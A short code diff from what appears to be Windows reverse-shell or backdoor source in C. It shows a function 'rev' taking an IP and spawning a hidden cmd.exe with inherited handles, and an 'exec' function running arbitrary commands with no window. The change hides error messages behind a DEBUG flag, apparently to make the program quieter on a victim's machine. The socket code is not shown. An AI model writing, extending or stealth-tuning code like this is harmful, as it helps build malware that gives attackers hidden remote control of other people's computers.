@@ -25,7 +25,9 @@ void rev(char* ip)
 
 	if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
 	{
+#ifdef DEBUG
 		printf("CreateProcess failed (%d).\n", GetLastError());
+#endif
 		return;
 	}
 }
@@ -41,7 +43,9 @@ void exec(char* cmd)
 	
 	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
 	{
+#ifdef DEBUG
 		printf("CreateProcess failed (%d).\n", GetLastError());
+#endif
 		return;
 	}
 
